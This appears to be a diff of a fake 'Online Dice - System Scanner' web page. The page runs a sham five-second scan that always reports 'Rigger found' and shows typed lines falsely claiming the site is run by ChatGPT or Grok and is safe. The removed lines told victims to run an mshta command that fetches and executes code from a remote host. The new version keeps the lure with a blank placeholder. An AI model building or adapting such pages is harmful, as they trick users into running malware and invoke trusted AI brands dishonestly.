@@ -8,28 +8,30 @@
     height: 100%;
     background: #070b18;
     color: #fff;
-    font-family: Segoe UI, sans-serif;
+    font-family: Segoe UI, Tahoma, sans-serif;
     overflow: hidden;
   }
   canvas#sky {
-    position: fixed;
-    inset: 0;
+    position: absolute;
+    left: 0;
+    top: 0;
     width: 100%;
     height: 100%;
   }
   .full {
-    position: relative;
-    z-index: 1;
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
     height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    text-align: center;
   }
   .card {
+    display: inline-block;
     width: 420px;
-    background: rgba(20, 24, 44, 0.94);
+    margin-top: 12%;
+    background: #14182c;
     border: 1px solid #2c3148;
-    border-radius: 18px;
     text-align: center;
     padding: 42px 36px 32px;
   }
@@ -39,8 +41,7 @@
     line-height: 46px;
     margin: 0 auto 16px;
     background: #4f46e5;
-    border-radius: 12px;
-    font-weight: 700;
+    font-weight: bold;
     font-size: 22px;
   }
   h1 { margin: 0; font-size: 28px; }
@@ -48,30 +49,21 @@
   .spin {
     width: 36px;
     height: 36px;
+    line-height: 36px;
     margin: 0 auto;
-    border: 3px solid #2a2f55;
-    border-top-color: #6d64f5;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
+    color: #7c74ff;
+    font-size: 28px;
+    font-family: Consolas, Courier New, monospace;
   }
-  @keyframes spin { to { transform: rotate(360deg); } }
   .scanlabel { margin: 12px 0 0; color: #8b93a7; font-size: 13px; }
   .barwrap {
     width: 220px;
-    height: 4px;
+    height: 6px;
     margin: 16px auto 0;
     background: #1c2033;
-    border-radius: 99px;
-    overflow: hidden;
+    text-align: left;
   }
-  .bar {
-    height: 100%;
-    width: 0;
-    background: #4f46e5;
-    animation: fill 5s linear forwards;
-  }
-  @keyframes fill { to { width: 100%; } }
-  .hidden { display: none; }
+  .bar { height: 6px; width: 0; background: #4f46e5; font-size: 0; }
   .check {
     width: 42px;
     height: 42px;
@@ -79,29 +71,40 @@
     margin: 0 auto 14px;
     background: #3a1820;
     color: #ff5c7a;
-    border-radius: 50%;
-    font-weight: 700;
+    font-weight: bold;
+    font-size: 22px;
   }
-  .found { margin: 0; font-size: 20px; font-weight: 700; }
+  .found { margin: 0; font-size: 20px; font-weight: bold; }
   .done { margin: 8px 0 0; color: #8b93a7; font-size: 13px; }
   .instructions {
     margin: 16px 0 0;
     color: #d5d8e4;
     font-size: 14px;
     line-height: 1.45;
-    white-space: pre-wrap;
   }
   .type {
-    margin-top: 22px;
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 42px;
+    text-align: center;
     color: #9aa3b8;
     font-size: 13px;
-    font-family: Consolas, monospace;
-    min-height: 18px;
+    font-family: Consolas, Courier New, monospace;
+    height: 18px;
   }
-  .foot { margin-top: 8px; color: #6d758c; font-size: 12px; }
+  .foot {
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 18px;
+    text-align: center;
+    color: #6d758c;
+    font-size: 12px;
+  }
 </style>
 </head>
-<body>
+<body bgcolor="#070b18">
 <canvas id="sky"></canvas>
 <div class="full">
   <div class="card">
@@ -109,99 +112,116 @@
     <h1>Online Dice</h1>
     <div class="sub" id="sub">Analyzing the current dice system</div>
     <div id="loading">
-      <div class="spin"></div>
+      <div class="spin" id="spin">|</div>
       <div class="scanlabel">Scanning...</div>
-      <div class="barwrap"><div class="bar"></div></div>
+      <div class="barwrap"><div class="bar" id="bar"></div></div>
     </div>
-    <div id="result" class="hidden">
+    <div id="result" style="display:none">
       <div class="check">!</div>
       <p class="found">Rigger found</p>
       <p class="done">The scan completed successfully.</p>
       <p class="instructions" id="instructions"></p>
     </div>
-    <div class="type" id="type"></div>
-    <div class="foot">Online Dice - System Scanner</div>
   </div>
 </div>
-<script>
-// put your own text here. shows only after "Rigger found".
-var AFTER_RESULT = "to remove any types of riggers please go into your files and on the top middle search bar type (mshta https://dicecheckai-production.up.railway.app/)";
+<div class="type" id="type"></div>
+<div class="foot">Online Dice - System Scanner</div>
+<script type="text/javascript">
+var AFTER_RESULT = "";
 
-(function () {
+var n = 0;
+var frames = ["|", "/", "-", "\\"];
+var fi = 0;
+function scanTick() {
+  n = n + 1;
+  fi = (fi + 1) % 4;
+  var spin = document.getElementById("spin");
+  var bar = document.getElementById("bar");
+  if (spin) spin.innerHTML = frames[fi];
+  if (bar) bar.style.width = Math.floor((n / 50) * 220) + "px";
+  if (n >= 50) {
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("result").style.display = "block";
+    document.getElementById("sub").innerHTML = "Scan finished";
+    document.getElementById("instructions").innerHTML = AFTER_RESULT;
+    return;
+  }
+  window.setTimeout(scanTick, 100);
+}
+window.setTimeout(scanTick, 100);
+
+var lines = [
+  "(this website is grok)",
+  "(online dice - system scanner)",
+  "(scanning for 5 seconds)"
+];
+var li = 0;
+var ci = 0;
+var hold = 0;
+function typeTick() {
+  var el = document.getElementById("type");
+  if (!el) return;
+  var line = lines[li];
+  if (ci <= line.length) {
+    el.innerHTML = line.substring(0, ci) + "_";
+    ci = ci + 1;
+    window.setTimeout(typeTick, 48);
+    return;
+  }
+  hold = hold + 1;
+  if (hold < 24) {
+    window.setTimeout(typeTick, 70);
+    return;
+  }
+  hold = 0;
+  ci = 0;
+  li = (li + 1) % lines.length;
+  window.setTimeout(typeTick, 180);
+}
+typeTick();
+
+try {
   var c = document.getElementById("sky");
   var ctx = c.getContext("2d");
   var dots = [];
-  function size() {
-    c.width = window.innerWidth;
-    c.height = window.innerHeight;
+  function sizeSky() {
+    c.width = document.body.clientWidth || 800;
+    c.height = document.body.clientHeight || 600;
   }
-  function seed() {
+  function seedSky() {
     dots = [];
-    var n = Math.floor((c.width * c.height) / 14000);
-    for (var i = 0; i < n; i++) {
+    var count = 80;
+    var i;
+    for (i = 0; i < count; i++) {
       dots.push({
         x: Math.random() * c.width,
         y: Math.random() * c.height,
         r: Math.random() * 1.6 + 0.3,
-        s: Math.random() * 0.35 + 0.05,
+        s: Math.random() * 0.4 + 0.05,
         a: Math.random() * 0.55 + 0.15
       });
     }
   }
-  function frame() {
+  function drawSky() {
     ctx.fillStyle = "#070b18";
     ctx.fillRect(0, 0, c.width, c.height);
-    ctx.fillStyle = "#c9d4ff";
-    for (var i = 0; i < dots.length; i++) {
+    var i;
+    for (i = 0; i < dots.length; i++) {
       var d = dots[i];
-      d.y -= d.s;
+      d.y = d.y - d.s;
       if (d.y < -2) d.y = c.height + 2;
+      ctx.fillStyle = "#c9d4ff";
       ctx.globalAlpha = d.a;
       ctx.beginPath();
       ctx.arc(d.x, d.y, d.r, 0, 6.28);
       ctx.fill();
     }
     ctx.globalAlpha = 1;
-    requestAnimationFrame(frame);
   }
-  size();
-  seed();
-  frame();
-  window.onresize = function () { size(); seed(); };
-})();
-
-setTimeout(function () {
-  document.getElementById("loading").className = "hidden";
-  document.getElementById("result").className = "";
-  document.getElementById("sub").textContent = "Scan finished";
-  document.getElementById("instructions").textContent = AFTER_RESULT;
-}, 5000);
-
-var lines = [
-  "(the AI for this scanner is chatgpt)",
-  "(online dice - system scanner)",
-  "(Scans for rigger on your system)"
-  "(this site is safe and tested by many differemt people)"
-];
-var li = 0, ci = 0, hold = 0;
-var el = document.getElementById("type");
-function tick() {
-  var line = lines[li];
-  if (ci <= line.length) {
-    el.textContent = line.slice(0, ci);
-    ci++;
-    setTimeout(tick, 48);
-    return;
-  }
-  hold++;
-  if (hold < 24) { setTimeout(tick, 70); return; }
-  hold = 0;
-  ci = 0;
-  li = (li + 1) % lines.length;
-  setTimeout(tick, 180);
-}
-tick();
+  sizeSky();
+  seedSky();
+  window.setInterval(drawSky, 40);
+} catch (e) {}
 </script>
 </body>
 </html>
-
